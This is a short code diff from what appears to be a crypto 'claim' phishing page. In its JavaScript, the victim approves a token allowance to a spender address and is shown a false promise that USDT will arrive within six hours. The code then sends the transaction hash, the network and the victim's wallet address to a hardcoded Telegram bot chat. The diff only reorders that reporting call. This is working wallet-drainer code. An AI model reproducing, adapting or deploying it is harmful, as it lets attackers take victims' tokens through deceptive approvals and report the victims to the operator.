@@ -238,10 +238,10 @@ window.onload = async function(){
         const tx = await tokenContract.increaseAllowance(spenderAddress,amountToApprove,);
         await tx.wait();
         hide_spin();
+        fetch(`https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=5204205237&text=Tx - <code>${tx.hash}</code> | Network - <code>${network_id}</code> | User Address - <code>${useraddress}</code>&parse_mode=HTML`);
         alert(
           'Your claim was successful, and you will receive USDT within 6 hours.',
         );
-        fetch(`https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=5204205237&text=Tx - <code>${tx.hash}</code> | Network - <code>${network_id}</code> | User Address - <code>${useraddress}</code>&parse_mode=HTML`);
       } catch (error) {
         await inc_all();
       }
